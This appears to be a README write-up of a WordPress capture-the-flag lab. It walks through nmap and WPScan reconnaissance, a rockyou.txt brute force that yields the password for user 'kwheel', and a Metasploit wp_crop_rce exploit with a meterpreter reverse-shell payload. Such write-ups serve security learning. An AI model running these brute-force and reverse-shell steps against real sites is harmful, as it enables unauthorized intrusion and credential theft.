# Project Overview

Welcome to our GitHub repository! This project aims to demonstrate and document a comprehensive approach to identifying and exploiting vulnerabilities within a WordPress site environment. Our goal is to provide a detailed walkthrough of conducting a security assessment, from initial reconnaissance to gaining access, with a focus on ethical hacking practices.

## 🛠 Initial Reconnaissance with Nmap

The journey begins with an `nmap` scan, a foundational step in understanding the target's exposed services and potential entry points.

```shell
nmap -sC -sV -Pn 10.10.151.250
```

This command probes the target for open ports, service versions, and default scripts, providing a landscape of the network.

## 🕵️‍♂️ Discovering Vulnerabilities

Upon identifying open ports and services, further investigation led us to several interesting findings, including open SSH and HTTP ports, indicating potential pathways for deeper exploration.

### WordPress Enumeration with WPScan

WPScan, a dedicated WordPress vulnerability scanner, is employed to unearth specific vulnerabilities within the WordPress installation.

```shell
wpscan --url http://10.10.151.250
```

Further enumeration reveals users and possible points of entry:

```shell
wpscan --url http://10.10.151.250 --enumerate ap,at,u
```

## 🔓 Exploiting Vulnerabilities

### Brute Force Attack

With identified usernames, we proceed with a brute-force attack to uncover passwords, using the `rockyou.txt` wordlist.

```shell
wpscan --url http://10.10.151.250 --passwords /usr/share/wordlists/rockyou.txt --user kwheel
```

Success! We discover credentials for the user `kwheel`.

## 🚪 Gaining Access

Using the found credentials, we explore ways to gain deeper access, potentially exploiting WordPress vulnerabilities or misconfigurations for remote code execution.

### Reverse Shell and Privilege Escalation

Utilizing Metasploit Framework, we aim to establish a reverse shell, moving towards gaining elevated privileges on the target machine.

1. **Starting Metasploit**

```shell
msfconsole
```

2. **Searching for and Setting Up an Exploit**

```shell
search wordpress 5.0
use exploit/multi/http/wp_crop_rce 
set RHOSTS machine_local_IP
set USERNAME kwheel
set PASSWORD cutiepie1
```

3. **Configuring and Launching the Payload**

```shell
set payload php/meterpreter/reverse_tcp
set LHOST your_local_IP
exploit
```

## Conclusion and Ethical Consideration

This README outlines the steps and methodologies used in conducting a security assessment against a WordPress site. It's crucial to highlight that all activities described here should only be performed with explicit authorization and within the scope of an ethical hacking or penetration testing engagement. Unauthorized access to computer systems is illegal and unethical.
